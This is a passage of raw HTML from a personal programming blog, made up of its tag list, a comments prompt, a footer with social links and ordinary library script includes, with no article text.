<a class="jtag" href="/tags/stego/">stego</a></span></div><div class="mt-3"><h4><abbr data-bs-placement="top" data-bs-toggle="tooltip" title="Related to programming">software.general</abbr></h4><span class="d-flex flex-wrap"><a class="jtag" href="/tags/programming/">programming</a> <a class="jtag" href="/tags/software-engineering/">software-engineering</a> <a class="jtag" href="/tags/web/">web</a> <a class="jtag" href="/tags/aoc/">aoc</a> <a class="jtag" href="/tags/apps/">apps</a> <a class="jtag" href="/tags/dsp/">dsp</a> <a class="jtag" href="/tags/programming-languages/">programming-languages</a> <a class="jtag" href="/tags/linux/">linux</a> <a class="jtag" href="/tags/performance/">performance</a> <a class="jtag" href="/tags/functional/">functional</a> <a class="jtag" href="/tags/types/">types</a> <a class="jtag" href="/tags/windows/">windows</a> <a class="jtag" href="/tags/ai/">ai</a> <a class="jtag" href="/tags/metaprogramming/">metaprogramming</a> <a class="jtag" href="/tags/oop/">oop</a></span></div><div class="mt-3"><h4><abbr data-bs-placement="top" data-bs-toggle="tooltip" title="Related to writeup">misc</abbr></h4><span class="d-flex flex-wrap"><a class="jtag" href="/tags/writeup/">writeup</a> <a class="jtag" href="/tags/notes/">notes</a> <a class="jtag" href="/tags/tutorial/">tutorial</a> <a class="jtag" href="/tags/reflection/">reflection</a> <a class="jtag" href="/tags/hkust/">hkust</a> <a class="jtag" href="/tags/project/">project</a> <a class="jtag" href="/tags/experience/">experience</a> <a class="jtag" href="/tags/faith/">faith</a> <a class="jtag" href="/tags/meta/">meta</a> <a class="jtag" href="/tags/learning/">learning</a> <a class="jtag" href="/tags/mathematics/">mathematics</a> <a class="jtag" href="/tags/cheatsheet/">cheatsheet</a> <a class="jtag" href="/tags/research/">research</a> <a class="jtag" href="/tags/satire/">satire</a> <a class="jtag" href="/tags/essay/">essay</a> <a class="jtag" href="/tags/reading/">reading</a></span></div></div><hr class="section-sep"><div class="container-md mt-4 p-4"><a id="comments"></a><p><em>Comments are back! Privacy-focused, without ads, bloatware 🤮, and trackers. Be one of the first to contribute to the discussion — I'd love to hear your thoughts.</em></p><script defer src="https://trebledj.me/js/comentario.min.js"></script><comentario-comments id="comentario" auto-init="false" no-fonts="true" css-override="false" theme="dark"></comentario-comments></div><br></div></div></article></div></div></div><footer class="d-flex flex-column gap-2"><div class="d-flex flex-row gap-3 mx-auto" style="width:fit-content;"><a rel="me noreferrer" href="https://github.com/TrebledJ" target="_blank"><i class="social-icon fab fa-github" style="color:rgb(150, 60, 180) !important;"></i> </a><a rel="me noreferrer" href="https://stackoverflow.com/users/10239789/trebledj" target="_blank"><i class="social-icon fab fa-stack-overflow" style="color:rgb(236, 124, 34) !important;"></i> </a><a rel="me noreferrer" href="https://www.codingame.com/profile/8444100ecb9723c1ec542346b0630aaa2821532" target="_blank"><i class="social-icon d-flex flex-column"><img src="/img/logos/codingame.webp" alt="" loading="lazy" decoding="async"></i></a><a rel="me noreferrer" href="https://soundcloud.com/trebledj" target="_blank"><i class="social-icon fab fa-soundcloud" style="color:rgb(237, 110, 30) !important;"></i> </a><a rel="me noreferrer" href="https://musescore.com/user/20636901" target="_blank"><i class="social-icon d-flex flex-column"><img src="/img/logos/musescore.webp" alt="" loading="lazy" decoding="async"></i></a><a rel="me noreferrer" href="https://discordapp.com/users/220427982798454794" target="_blank"><i class="social-icon fab fa-discord" style="color:rgb(84, 100, 235) !important;"></i> </a><a rel="me" href="mailto:trebledjjj@gmail.com"><i class="social-icon fas fa-envelope"></i> </a><a rel="me" href="/feeds"><i class="social-icon fas fa-square-rss"></i></a></div><p>Copyright&nbsp;©&nbsp;2025&nbsp;TrebledJ • <a href="/privacy-policy">Privacy&nbsp;Policy</a> • <a href="https://github.com/TrebledJ/trebledj.github.io?tab=readme-ov-file#credits--appreciation" rel="noreferrer" target="_blank">Credits</a></p></footer><script defer src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/jquery.magnific-popup.min.js"></script><script>var tocOptions={}</script><script defer src="/cb/MPnrKnjI5w.js"></script><script defer src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon="{&quot;token&quot;: &quot;52d99b3d385b4c9a98ac8ad109a95a2a&quot;}"></script></body></html>